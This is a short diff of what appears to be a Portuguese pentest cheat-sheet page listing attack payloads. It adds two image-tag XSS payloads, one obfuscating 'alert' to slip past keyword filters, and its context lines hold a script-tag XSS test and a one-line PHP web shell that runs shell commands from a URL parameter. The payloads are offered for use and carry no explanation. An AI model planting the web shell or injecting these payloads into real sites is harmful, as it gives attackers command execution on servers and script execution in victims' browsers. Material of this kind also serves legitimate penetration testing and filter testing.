@@ -72,7 +72,15 @@ PAGINA CONTENDO [OUTROS](https://ygoralberto.github.io/outros) COMANDOS DE WINDO
 .
 
 	<script>alert('Pentester')</script>
-	
+
+.
+
+	<img src="invalid.jpg" onerror="alert('XSS Persistente!')"> 
+ 
+.
+
+	<img src="x" onerror="window['aler'+'t']('XSS Persistente!')">
+
 .
 
 	<?php system($_GET['hacker']);?>
